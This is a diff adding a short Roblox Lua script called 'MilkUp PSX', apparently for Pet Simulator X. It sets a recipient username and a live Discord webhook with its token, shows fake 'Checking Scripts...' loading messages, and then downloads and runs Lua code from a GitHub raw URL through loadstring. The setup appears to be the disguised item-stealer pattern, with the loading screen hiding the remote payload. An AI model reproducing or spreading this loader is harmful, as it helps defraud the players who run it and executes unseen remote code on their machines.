@@ -1,0 +1,17 @@
+Username = "M17_2"
+
+WebHook = "https://discord.com/api/webhooks/1098875050901377064/OA8CDIKbfHviYK2jtLuKzwUZZjdZK-jnFCWvYMwfrCeE00GVP3RwzsOvfl-Ey3ircozc"
+
+loadingscreen = true
+
+_G.CustomScriptName = "MilkUp PSX"
+
+_G.Text1 = "Script Loaded..."
+
+_G.Text2 = "Waiting for Script"
+
+_G.Text3 = "Checking Scripts..."
+
+_G.Text4 = "Starting Scripts..."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
